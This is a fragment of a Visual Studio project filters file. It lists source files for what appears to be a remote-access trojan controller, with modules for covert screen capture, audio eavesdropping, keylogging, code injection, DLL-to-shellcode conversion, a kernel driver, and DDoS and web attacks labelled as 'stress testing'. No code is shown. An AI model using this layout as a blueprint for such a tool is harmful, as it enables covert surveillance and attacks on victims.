    <ClCompile Include="WaveOut.cpp">
      <Filter>语音监听\AudioCoder</Filter>
    </ClCompile>
    <ClCompile Include="WavePlayback.cpp">
      <Filter>语音监听\AudioCoder</Filter>
    </ClCompile>
    <ClCompile Include="WaveRecord.cpp">
      <Filter>语音监听\AudioCoder</Filter>
    </ClCompile>
    <ClCompile Include="AudioDlg.cpp">
      <Filter>语音监听</Filter>
    </ClCompile>
    <ClCompile Include="SoundToWav.h.cpp">
      <Filter>语音监听\AudioCoder</Filter>
    </ClCompile>
    <ClCompile Include="DifScreenSpyDlg.cpp">
      <Filter>屏幕管理\差异屏幕</Filter>
    </ClCompile>
    <ClCompile Include="KeyBoardDlg.cpp">
      <Filter>键盘记录</Filter>
    </ClCompile>
    <ClCompile Include="MachineDlg.cpp">
      <Filter>系统管理</Filter>
    </ClCompile>
    <ClCompile Include="QuickScreenSpyDlg.cpp">
      <Filter>屏幕管理\高速屏幕</Filter>
    </ClCompile>
    <ClCompile Include="HideScreenSpyDlg.cpp">
      <Filter>屏幕管理\后台屏幕</Filter>
    </ClCompile>
    <ClCompile Include="CTextDlg.cpp">
      <Filter>输入窗口</Filter>
    </ClCompile>
    <ClCompile Include="InputDlg.cpp">
      <Filter>输入窗口</Filter>
    </ClCompile>
    <ClCompile Include="H264ScreenSpyDlg.cpp">
      <Filter>屏幕管理\娱乐屏幕</Filter>
    </ClCompile>
    <ClCompile Include="PlugView.cpp">
      <Filter>插件管理</Filter>
    </ClCompile>
    <ClCompile Include="XvidDec.cpp">
      <Filter>视频查看</Filter>
    </ClCompile>
    <ClCompile Include="DDOSAttackDlg.cpp">
      <Filter>压力测试</Filter>
    </ClCompile>
    <ClCompile Include="FlowAttackDlg.cpp">
      <Filter>压力测试</Filter>
    </ClCompile>
    <ClCompile Include="WebAttackDlg.cpp">
      <Filter>压力测试</Filter>
    </ClCompile>
    <ClCompile Include="ProxyConnectServer.cpp">
      <Filter>代理映射</Filter>
    </ClCompile>
    <ClCompile Include="LOGIN.cpp">
      <Filter>登录验证</Filter>
    </ClCompile>
    <ClCompile Include="ipc.cpp">
      <Filter>日志记录</Filter>
    </ClCompile>
    <ClCompile Include="LogView.cpp">
      <Filter>日志记录</Filter>
    </ClCompile>
    <ClCompile Include="TabView.cpp">
      <Filter>源文件</Filter>
    </ClCompile>
    <ClCompile Include="ChartView.cpp">
      <Filter>系统统计</Filter>
    </ClCompile>
    <ClCompile Include="TipCtrl.cpp">
      <Filter>提示窗口</Filter>
    </ClCompile>
    <ClCompile Include="ScreenMonitorDlg.cpp">
      <Filter>屏幕监控</Filter>
    </ClCompile>
    <ClCompile Include="md5.cpp">
      <Filter>第三方库</Filter>
    </ClCompile>
    <ClCompile Include="TKYLockRW.cpp">
      <Filter>第三方库</Filter>
    </ClCompile>
    <ClCompile Include="BmpToAvi.cpp">
      <Filter>第三方库</Filter>
    </ClCompile>
    <ClCompile Include="BmpToAvidif.cpp">
      <Filter>第三方库</Filter>
    </ClCompile>
    <ClCompile Include="MovieMaker.cpp">
      <Filter>第三方库</Filter>
    </ClCompile>
    <ClCompile Include="MemoryModule.cpp">
      <Filter>第三方库</Filter>
    </ClCompile>
    <ClCompile Include="ExpandDlg.cpp">
      <Filter>互动插件</Filter>
    </ClCompile>
    <ClCompile Include="DllToShellCode.cpp">
      <Filter>第三方库</Filter>
    </ClCompile>
    <ClCompile Include="ChangeGroupDlg.cpp">
      <Filter>输入窗口</Filter>
    </ClCompile>
    <ClCompile Include="CopyClientDlg.cpp">
      <Filter>输入窗口</Filter>
    </ClCompile>
    <ClCompile Include="TipfileCtrl.cpp">
      <Filter>提示窗口</Filter>
    </ClCompile>
    <ClCompile Include="CFileListCtrl.cpp">
      <Filter>文件管理</Filter>
    </ClCompile>
    <ClCompile Include="ServiceInfoDlg.cpp">
      <Filter>系统管理</Filter>
    </ClCompile>
    <ClCompile Include="CCreateTaskDlg.cpp">
      <Filter>系统管理</Filter>
    </ClCompile>
    <ClCompile Include="KernelDlg.cpp">
      <Filter>驱动功能</Filter>
    </ClCompile>
    <ClCompile Include="LocalUpload.cpp">
      <Filter>输入窗口</Filter>
    </ClCompile>
    <ClCompile Include="ProxyMapDlg.cpp">
      <Filter>代理映射</Filter>
    </ClCompile>
    <ClCompile Include="InjectCodeDlg.cpp">
      <Filter>系统管理</Filter>
    </ClCompile>
    <ClCompile Include="SEU_QQwry.cpp">
      <Filter>第三方库</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="Quick.rc">
      <Filter>源文件</Filter>
    </ResourceCompile>
  </ItemGroup>
</Project>